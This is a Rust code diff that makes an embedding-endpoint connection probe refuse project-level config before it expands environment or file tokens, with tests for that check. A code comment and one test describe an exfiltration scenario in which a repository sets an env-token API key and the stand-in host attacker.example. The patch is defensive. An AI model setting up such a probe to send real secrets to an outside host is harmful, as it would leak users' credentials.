@@ -935,7 +935,25 @@ fn prepare_embedding_probe_options(
     api_key: Option<String>,
     input_type: Option<String>,
     truncate: Option<String>,
+    source: Option<String>,
 ) -> Result<EmbeddingProbeOptions, EmbeddingProbeOutcome> {
+    // TRUST BOUNDARY. Token expansion + contacting the endpoint is only safe for
+    // USER-level config, whose values are the user's own. Project config is
+    // untrusted repository input: a malicious repo could set
+    // `api_key: "{env:GITHUB_TOKEN}"` + an attacker endpoint and exfiltrate the
+    // secret on one "Test Connection" click. Default-deny: only an explicit
+    // "user" source is allowed (frontend hides the button for projects anyway;
+    // this is the enforced backend boundary). An absent source is treated as
+    // user for backward-compat with the single existing (user-config) caller.
+    match source.as_deref() {
+        Some("user") | None => {}
+        Some(other) => {
+            return Err(EmbeddingProbeOutcome::ScopeNotAllowed {
+                scope: other.to_string(),
+            });
+        }
+    }
+
     // Relative `{file:}` references resolve against the user config file's dir,
     // matching the plugin's load-time resolution.
     let config_dir = config::resolve_user_config_path()
@@ -974,12 +992,16 @@ pub async fn test_embedding_endpoint(
     api_key: Option<String>,
     input_type: Option<String>,
     truncate: Option<String>,
+    // "user" (the only scope that expands tokens + probes) or "project"
+    // (refused). Absent = user, for the existing user-config caller.
+    source: Option<String>,
 ) -> EmbeddingProbeOutcome {
-    let options =
-        match prepare_embedding_probe_options(endpoint, model, api_key, input_type, truncate) {
-            Ok(options) => options,
-            Err(outcome) => return outcome,
-        };
+    let options = match prepare_embedding_probe_options(
+        endpoint, model, api_key, input_type, truncate, source,
+    ) {
+        Ok(options) => options,
+        Err(outcome) => return outcome,
+    };
     probe_embedding_endpoint(options).await
 }
 
@@ -1166,6 +1188,7 @@ mod tests {
             Some(token),
             None,
             None,
+            None,
         )
         .expect("resolvable file token should expand, not error");
 
@@ -1181,6 +1204,7 @@ mod tests {
             "https://example.com/v1".to_string(),
             "{env:MC_DASHBOARD_TEST_MODEL}".to_string(),
             Some("literal-key".to_string()),
+            None,
             None,
             None,
         )
@@ -1199,6 +1223,7 @@ mod tests {
             Some("{env:MC_DASHBOARD_UNSET_TEST_VAR}".to_string()),
             None,
             None,
+            None,
         )
         .expect_err("an unset env token must not reach the network");
 
@@ -1209,5 +1234,44 @@ mod tests {
             }
             other => panic!("expected unresolved token, got {other:?}"),
         }
+    }
+
+    #[test]
+    fn embedding_probe_refuses_project_scope_without_expanding() {
+        // Project config is untrusted. A project-scope probe must refuse BEFORE
+        // expanding any {env:}/{file:} token, so a malicious repo can't
+        // exfiltrate a secret to its endpoint via one Test Connection click.
+        std::env::set_var("MC_DASHBOARD_PROJECT_SECRET", "should-not-leak");
+        let outcome = prepare_embedding_probe_options(
+            "https://attacker.example/v1".to_string(),
+            "text-embedding-3-small".to_string(),
+            Some("{env:MC_DASHBOARD_PROJECT_SECRET}".to_string()),
+            None,
+            None,
+            Some("project".to_string()),
+        )
+        .expect_err("project scope must be refused");
+        std::env::remove_var("MC_DASHBOARD_PROJECT_SECRET");
+
+        match outcome {
+            EmbeddingProbeOutcome::ScopeNotAllowed { scope } => assert_eq!(scope, "project"),
+            other => panic!("expected scope refusal, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn embedding_probe_allows_explicit_user_scope() {
+        std::env::set_var("MC_DASHBOARD_USER_SCOPE_MODEL", "ok-model");
+        let options = prepare_embedding_probe_options(
+            "https://example.com/v1".to_string(),
+            "{env:MC_DASHBOARD_USER_SCOPE_MODEL}".to_string(),
+            None,
+            None,
+            None,
+            Some("user".to_string()),
+        )
+        .expect("explicit user scope should expand + probe");
+        std::env::remove_var("MC_DASHBOARD_USER_SCOPE_MODEL");
+        assert_eq!(options.model, "ok-model");
     }
 }
